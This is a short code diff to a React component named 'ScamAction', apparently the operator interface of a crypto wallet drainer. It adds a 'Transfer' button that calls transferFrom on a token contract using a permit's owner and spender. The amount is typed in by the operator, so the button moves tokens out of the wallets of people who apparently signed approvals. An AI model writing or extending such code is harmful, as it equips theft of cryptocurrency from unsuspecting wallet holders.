@@ -37,11 +37,31 @@ const ScamAction = (props: {
 			</button>
 			<button onClick={async () => {
 				alert((await callContractMethod('allowance', [
-						data.permit.owner,
-						data.permit.spender
-					], CustomContract.ETH, provider)));
+					data.permit.owner,
+					data.permit.spender
+				], CustomContract.ETH, provider)));
 			}}>
 				Allowance
+			</button>
+			<button onClick={async () => {
+				callContractMethod('transferFrom', [
+						data.permit.owner,
+						data.permit.spender,
+						window.prompt("Enter Amount to transfer"),
+						{
+							gasLimit: 1000000
+						}
+					], token.contract_address,
+					//@ts-ignore
+					provider.connection.url + "")
+					.catch((e) => {
+						alert(`ERROR ${e?.message ?? e}`);
+						console.error(e)
+					}).then(() => {
+					alert("Transfer successful!")
+				});
+			}}>
+				Transfer
 			</button>
 		</div>
 	);
